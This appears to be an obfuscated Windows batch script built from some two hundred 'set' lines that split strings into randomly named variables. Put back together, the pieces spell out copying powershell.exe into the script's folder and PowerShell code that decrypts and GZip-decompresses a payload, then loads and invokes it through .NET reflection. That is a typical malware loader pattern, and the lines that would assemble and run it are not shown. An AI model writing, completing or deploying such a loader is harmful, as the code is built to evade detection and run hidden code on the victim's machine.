@echo off
set "XLsbORZTdZ=rs"
set "GRNHKfIuzm= /"
set "rAsgoIdNrQ=0\"
set "keGyRakemo=\W"
set "sgDCGUOTbe=ow"
set "ausjIcAjsf=1."
set "GrAscyULgf=ll"
set "IjuIaGGUPB=co"
set "mBhRFOpEfN=st"
set "yrNNpUthwc=nd"
set "hOZJoXaGYS=do"
set "QBYfVweWjU=we"
set "USgMHpPJik=Wi"
set "wcYSunWnxI=in"
set "JMdrTWhOxN=.e"
set "oxYoUAFhEc=he"
set "aDftpDlWqX=rS"
set "FOQnlYoArm= C"
set "BVIeIgvVKD=em"
set "FTFgggRjgD=xe"
set "ssZrIrlpfC=\v"
set "YNaPMQfEDd=he"
set "PHQaqCuHvX=y "
set "pRdYBBcscc=ll"
set "UwxCxFIEUX=:\"
set "rlvyJkWQPX=py"
set "ZTQcCxpjmI=ws"
set "iFrgODJJmC=Sy"
set "npBATMOwNd=32"
set "BsVRdMHeFV=s\"
set "EPyadlZrKZ=we"
set "IzPlFFNIgu=po"
set "VrJvglqIgG=Po"
set "kiIcBMaraO= %~dp0"
set "fcoGJblsTD=cd"
set "KvVTEpYnXP=ddin"
set "PFqmgaGqTO=7;$s"
set "wLVgaNoJbF=g = "
set "kKALRGUfEx=niKt"
set "fThIdtczpL=]::N"
set "mnsSNpMLef=ptor"
set "mNExjUlxxW=KdmM"
set "tiDbSHVTHo=eam("
set "heqtPDEJvG=ress"
set "rmjPHSnCEv=comp"
set "emUMmYnPUW=16] "
set "iimnOgLNnS=k; }"
set "dpmXlCuFAA=1] -"
set "JgykgxYGkc=[Env"
set "DsiDgXjdnG=sKdm"
set "eCpiEBDzKX=-4] "
set "nkDueQIImg=lit("
set "XTIhoFQUdR=$jws"
set "kSQMIYWXIS=KdmM"
set "eqQXBrznxp=$cZh"
set "ZXTejhopwW=Y = "
set "inUnPfyWss==');"
set "lYlSqgeQiU='')("
set "axWsgRMkgK= = $"
set "TqxbxqSMuG=v4Ir"
set "xDNBYZzZYh=$niK"
set "AJoPysfaby=:('g"
set "dYGkgUJUyz=stem"
set "rcKDBTpVnW=.Sec"
set "IunZyFBukE=;$Al"
set "ToTNkeNFcI=z.Su"
set "lLqJLuiFeH= = ["
set "OnvQLYcdWW=yste"
set "lOMHAWGPiz=Mode"
set "lDjWJHMSFG=nY.D"
set "gwKmpovAuW=();$"
set "lKBFiYvQNG=O.Me"
set "yTFqHmqYvn=em.C"
set "jGLgcjVhXu=uj ="
set "tihnbiCDav=in $"
set "AQDYpYbAZn=New-"
set "RyyreXMSoi='dqR"
set "SpsdeQKXdI=.-16"
set "WmlcVerTlm=6esa"
set "WdBvqnfllF=m.Re"
set "BPlVyfUMLm=YHwD"
set "KrLLuLhJdc=x = "
set "vXBPjYvDVY=3); "
set "thsaGNvvoU=.GZi"
set "vqIEYkbCMw=rity"
set "DaCvvqTCCp=e = "
set "pBvMnvuFCM=; };"
set "poPYiLuLFa=th('"
set "mHbNHLyneg=::('"
set "PfBgDoNcjc=oL'["
set "tvciRfICnP=cZhw"
set "YACQsKENmv=ateD"
set "NtGlyfWPEf=pose"
set "IDZinALxpV=oryS"
set "scDICUFzWU=ck($"
set "fAwSxmyRaQ=Invo"
set "KWycriImhD=.Mem"
set "BWdXuATRlo=iSv "
set "QbEwTpoGsf== $s"
set "zUsQigmzrm=ypto"
set "FEIvXyQfUr=pDZz"
set "vaTEDMwyWv=Star"
set "QLZTasdvfu=esaB"
set "IHusdyoaSu=.Dis"
set "vNDgzsOlkq=ing("
set "zYPWuCbmWm=NWnY"
set "gUCCqbqwYj=y.Pa"
set "fqozxPaNzC=x, 0"
set "XpJageXQQa=;$cZ"
set "KZSwaBSxmb=OyzA"
set "OLhrhMtVnB=ptog"
set "LSZPhOhigO=('da"
set "SQTOqQufsw=..-1"
set "ySQFSmvXKp= [st"
set "ElkghzIiDP=and "
set "ayRkHUjFaf=e]::"
set "nifjBQtnxS= '')"
set "PkbEqDpRHo=iKtx"
set "OYicSYWNyX=raph"
set "KormxSPvBI=iKtx"
set "ddtiXdWinF=[-1."
set "UgzSFqCIen=tnGu"
set "oxIrVKtIMt=ress"
set "rZPLxntKGw=UE ="
set "EiJpeSDHZo=]::C"
set "mnCtodlNFm=Secu"
set "BUJtizKioi=7Yiv"
set "EbxyaYcLwY=flec"
set "vrBesYKiIw=$Pdm"
set "zlaiPUNuYi=n ''"
set "phAtrhlUvS=  $d"
set "prxPTRrknK= [Sy"
set "MFSfIHasCk=)))"
set "BukQptFtLb=niKt"
set "coJAyOfmfm=736u"
set "fMlaIjqDHH=..-1"
set "qngqgJxEzP=TllA"
set "pKsBDAOzyp== [S"
set "atiwhXlHoP=Disp"
set "sZVHLZDCXj=qsSF"
set "bAsmNcDkvZ=iron"
set "tfxydeMGMi=niKt"
set "BaFKKJCsQZ=::De"
set "IXkYnqgiUz=('%*'"
set "pbuQTErsdW=$ANW"
set "BxxlbvSGVs=rity"
set "GncNIhoqKn=morF"
set "AyeYcuMCJw=j) {"
set "NjeyxFcDdK=Comp"
set "zSoecBkSNQ=pres"
set "NQCkdKmVDb=.Con"
set "sVvMKaRuqJ=bstr"
set "uFsssZZRzi===')"
set "KMqBiXzwNX=+hAO"
set "XHTRqSyDff=0O+g"
set "EnzrOpsUkc=$niK"
set "CpHOlCNHbg=MH.T"
set "BdZALTlLWr=);$s"
set "CnJzaiEGfw=ert]"
set "lKTRARjLHE=m(, "
set "wXOSUrTroJ=oin "
set "NHNZMgQUfG=yste"
set "VgwzxbfVqV='[-1"
set "rmOhhIYynA=bjec"
set "qUGwTxrxca=yTo("
set "EJzJZQYesn=]::("
set "oFuZYDYKyr=)($d"
set "BXPNhfdVDJ=esFX"
set "RbSLpbTKDr=em.I"
set "EPaDKRSsEN=comm"
set "gZzLgwrNlP=();$"
set "xlDSgoVQlh=Disp"
set "iUFjtkCWkp=, (,"
set "DdLuVpIMXs=$Pdm"
